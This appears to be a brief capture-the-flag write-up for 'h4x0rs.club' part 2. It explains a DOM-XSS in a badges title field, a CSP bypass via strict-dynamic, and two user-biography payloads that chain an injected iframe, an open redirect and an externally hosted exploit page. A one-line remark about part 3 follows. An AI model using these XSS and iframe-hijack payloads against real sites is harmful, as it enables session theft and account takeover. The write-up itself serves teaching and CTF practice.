# h4x0rs.club part 2

Upload [exploit.html](exploit.html) and [alert.js](alert.js) to `l4w.io` for example.

Create 2 users: `blah1` && `blah2`

Root cause:

There is DOM-XSS at `client.js` when setting `title` on `badges` function. CSP contains `strict-dynamic`, so you can just simply inject `'><script>...</script>`

To do it, take a look at the backend side, they will send a message to `top` not `parent` . so we can inject our evil iframe in the middle.

### blah1
Set biography as the following:
```
<a href='//l4w.io/exploit.html' id=report-btn>
```

### blah2
Set biography as the following:
```
<a href='/game/?msg=<iframe name=game_server src=/game/user.php/blah1%23report></iframe>' id=report-btn></a>
```

`<iframe>` with a local src is allowed by XSS Auditor. So using open-redirect for 2 various reason.

Then report `blah2` user along with `#report`


# h4x0rs.club part 3

I really like my idea behind this one. Pwn the binary with full mitigations shipped. 

Hopefully someone can write about it :(
